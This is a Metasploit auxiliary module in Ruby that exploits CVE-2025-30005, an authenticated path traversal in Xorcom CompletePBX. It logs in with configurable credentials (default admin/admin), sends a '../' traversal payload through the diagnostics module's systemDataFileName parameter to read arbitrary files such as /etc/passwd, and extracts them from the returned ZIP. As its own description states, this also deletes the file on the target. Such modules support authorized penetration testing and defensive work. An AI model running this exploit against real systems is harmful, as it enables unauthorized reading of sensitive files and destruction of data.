##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      update_info(
        info,
        'Name' => 'Xorcom CompletePBX Arbitrary File Read and Deletion via systemDataFileName',
        'Description' => %q{
          This module exploits an authenticated path traversal vulnerability in
          Xorcom CompletePBX <= 5.2.35. The issue occurs due to improper validation of the
          `systemDataFileName` parameter in the `diagnostics` module, allowing authenticated attackers
          to retrieve arbitrary files from the system.

          Additionally, the exploitation of this vulnerability results in the **deletion** of the
          requested file from the target system.

          The vulnerability is identified as CVE-2025-30005.
        },
        'Author' => ['Valentin Lobstein'],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2025-30005'],
          ['URL', 'https://www.xorcom.com/products/completepbx/'],
          ['URL', 'https://chocapikk.com/posts/2025/completepbx/']
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RHOST,
        Opt::RPORT(80),
        OptString.new('TARGETURI', [true, 'Base path of the CompletePBX instance', '/']),
        OptString.new('USERNAME', [true, 'Username for authentication', 'admin']),
        OptString.new('PASSWORD', [true, 'Password for authentication', 'admin']),
        OptString.new('TARGETFILE', [true, 'File to retrieve from the system', '/etc/passwd'])
      ]
    )
  end

  def login
    print_status("Attempting authentication with username: #{datastore['USERNAME']}")

    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI'], 'login'),
      'method' => 'POST',
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        'userid' => datastore['USERNAME'],
        'userpass' => datastore['PASSWORD']
      }
    })

    unless res
      fail_with(Failure::Unreachable, 'No response from target')
    end

    unless res.code == 200
      fail_with(Failure::UnexpectedReply, "Unexpected HTTP response code: #{res.code}")
    end

    sid_cookie = res.get_cookies.scan(/sid=[a-f0-9]+/).first

    unless sid_cookie
      fail_with(Failure::NoAccess, 'Authentication failed: No session ID received')
    end

    print_good("Authentication successful! Session ID: #{sid_cookie}")
    return sid_cookie
  end

  def run
    sid_cookie = login
    target_file = "../../../../../../../../../../..#{datastore['TARGETFILE']}"

    print_status("Attempting to read file: #{target_file}")

    res = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI']),
      'method' => 'GET',
      'headers' => {
        'Cookie' => sid_cookie
      },
      'vars_get' => {
        'class' => 'diagnostics',
        'method' => 'stopMode',
        'systemDataFileName' => target_file
      }
    })

    unless res
      fail_with(Failure::Unreachable, 'No response from target')
    end

    unless res.code == 200
      fail_with(Failure::UnexpectedReply, "Unexpected HTTP response code: #{res.code}")
    end

    body = res.body.lines[0..-2].join

    if res.headers['Content-Type']&.include?('application/zip')
      print_status('ZIP file received, attempting to list files')

      files_list = list_files_in_zip(body)

      if files_list.empty?
        fail_with(Failure::NotVulnerable, 'ZIP archive received but contains no files.')
      end

      print_status("Files inside ZIP archive:\n - " + files_list.join("\n - "))

      extracted_content = read_file_from_zip(body, File.basename(target_file), files_list)

      if extracted_content
        print_good("Content of #{datastore['TARGETFILE']}:\n#{extracted_content}")
      else
        fail_with(Failure::NotVulnerable, 'File not found in ZIP archive.')
      end
    else
      print_good("Raw file content received:\n#{body}")
    end

    print_warning('WARNING: This exploit causes the deletion of the requested file on the target if the privileges allows it.')
  end

  def list_files_in_zip(zip_data)
    files = []

    ::Zip::InputStream.open(StringIO.new(zip_data)) do |io|
      while (entry = io.get_next_entry)
        files << entry.name
      end
    end

    files
  end

  def read_file_from_zip(zip_data, target_filename, files_list)
    file_content = nil

    possible_matches = files_list.select { |f| f.include?(target_filename) }

    if possible_matches.empty?
      return nil
    end

    correct_filename = possible_matches.first

    ::Zip::InputStream.open(StringIO.new(zip_data)) do |io|
      while (entry = io.get_next_entry)
        if entry.name == correct_filename
          file_content = io.read
          break
        end
      end
    end

    file_content
  end
end
